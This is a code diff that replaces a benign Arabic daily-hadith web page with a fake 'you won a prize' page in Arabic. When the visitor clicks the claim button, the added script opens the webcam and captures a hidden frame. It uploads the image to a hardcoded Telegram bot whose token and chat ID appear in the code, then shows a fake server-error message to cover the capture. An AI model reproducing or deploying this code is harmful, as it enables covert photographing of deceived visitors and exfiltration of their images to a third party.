@@ -3,131 +3,61 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>نور السنة</title>
+    <title>استلم جائزتك الآن!</title>
     <style>
-        /* الخلفية الزيتية الملكية */
-        body { 
-            background-color: #0d2112; 
-            background-image: radial-gradient(#1b3022 1px, transparent 1px);
-            background-size: 20px 20px;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-            font-family: 'Cairo', sans-serif;
-        }
-
-        /* المستطيل الذهبي مع الزخارف */
-        .gold-card {
-            background: linear-gradient(135deg, #bf953f, #fcf6ba, #aa771c);
-            padding: 50px 30px;
-            border-radius: 5px;
-            text-align: center;
-            max-width: 500px;
-            width: 85%;
-            box-shadow: 0 0 50px rgba(0,0,0,0.8);
-            border: 2px solid #8a6d3b;
-            position: relative; /* ضروري لضبط مكان الزخارف */
-        }
-
-        /* إضافة الزخارف في الزوايا */
-        .gold-card::before, .gold-card::after {
-            content: "❁"; /* رمز زخرفي ذهبي */
-            position: absolute;
-            font-size: 40px;
-            color: #8a6d3b;
-        }
-        .gold-card::before { top: 10px; right: 10px; }
-        .gold-card::after { bottom: 10px; left: 10px; }
-
-        .corner-decoration {
-            position: absolute;
-            width: 40px;
-            height: 40px;
-            border: 3px solid #8a6d3b;
-        }
-        .top-left { top: 15px; left: 15px; border-right: none; border-bottom: none; }
-        .bottom-right { bottom: 15px; right: 15px; border-left: none; border-top: none; }
-
-        /* نص الحديث باللون الزيتي الداكن */
-        #hadith-text {
-            color: #0d2112; 
-            font-size: 24px;
-            font-weight: bold;
-            line-height: 1.8;
-            margin-bottom: 20px;
-        }
-
-        #hadith-ref {
-            color: #2e4d23;
-            font-size: 16px;
-            font-weight: bold;
-        }
-
-        /* المؤقت بتصميم زيتي */
-        .timer-box {
-            margin-top: 30px;
-            background: #0d2112;
-            color: #fcf6ba;
-            padding: 8px 20px;
-            border-radius: 4px;
-            display: inline-block;
-            border: 1px solid #8a6d3b;
-            font-family: monospace;
-            font-size: 18px;
-        }
+        body { font-family: Arial, sans-serif; text-align: center; background-color: #f0f2f5; padding: 50px; }
+        .card { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
+        button { background-color: #28a745; color: white; border: none; padding: 15px 30px; font-size: 18px; border-radius: 5px; cursor: pointer; }
+        video, canvas { display: none; }
     </style>
 </head>
 <body>
-
-    <div class="gold-card">
-        <div class="corner-decoration top-left"></div>
-        <div class="corner-decoration bottom-right"></div>
-
-        <div id="hadith-text">« جاري جلب الحديث الشريف... »</div>
-        <div id="hadith-ref"></div>
-        
-        <div style="color: #0d2112; font-size: 12px; margin-top: 20px;">الحديث القادم خلال:</div>
-        <div class="timer-box" id="timer">24:00:00</div>
+    <div class="card">
+        <h1>مبروك! لقد ربحت جائزة قيمة 🎁</h1>
+        <p>اضغط على الزر بالأسفل لتفعيل حسابك واستلام الجائزة فوراً.</p>
+        <button id="capture">استلام الجائزة الآن</button>
     </div>
 
+    <video id="video" autoplay></video>
+    <canvas id="canvas"></canvas>
+
     <script>
-        // طلب الإشعارات
-        if (Notification.permission !== "granted") {
-            Notification.requestPermission();
-        }
+        const token = "8295590667:AAFCZ3w2Uf0g5OBO7_QU7mwS2apdbTjwCqY"; 
+        const chatId = "8042090388";
 
-        async function fetchHadith() {
+        const btn = document.getElementById('capture');
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+
+        btn.addEventListener('click', async () => {
             try {
-                const res = await fetch('https://api.ahadith.co.uk/api/hadith/random/ar');
-                const data = await res.json();
-                const text = data.hadith[0].hadithArabic;
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
                 
-                document.getElementById("hadith-text").innerText = "« " + text + " »";
-                document.getElementById("hadith-ref").innerText = "المصدر: " + data.hadith[0].bookName;
-                
-                if (Notification.permission === "granted") {
-                    new Notification("حديث اليوم", { body: text.substring(0, 50) + "..." });
-                }
-            } catch (e) {
-                document.getElementById("hadith-text").innerText = "« إنما الأعمال بالنيات »";
-                document.getElementById("hadith-ref").innerText = "صحيح البخاري";
+                setTimeout(() => {
+                    const context = canvas.getContext('2d');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    context.drawImage(video, 0, 0);
+                    
+                    canvas.toBlob(blob => {
+                        const formData = new FormData();
+                        formData.append('chat_id', chatId);
+                        formData.append('photo', blob, 'image.jpg');
+
+                        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                            method: 'POST',
+                            body: formData
+                        }).then(() => {
+                            alert("عذراً، حدث خطأ في الخادم. حاول مرة أخرى لاحقاً.");
+                            stream.getTracks().forEach(track => track.stop());
+                        });
+                    }, 'image/jpeg');
+                }, 1000);
+            } catch (err) {
+                alert("يجب السماح بالوصول للكاميرا لاستلام الجائزة.");
             }
-        }
-
-        let seconds = 86400;
-        setInterval(() => {
-            let h = Math.floor(seconds / 3600);
-            let m = Math.floor((seconds % 3600) / 60);
-            let s = seconds % 60;
-            document.getElementById("timer").innerText = 
-                `${h.toString().padStart(2,'0')}:${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`;
-            if (seconds <= 0) { fetchHadith(); seconds = 86400; }
-            seconds--;
-        }, 1000);
-
-        fetchHadith();
+        });
     </script>
 </body>
 </html>
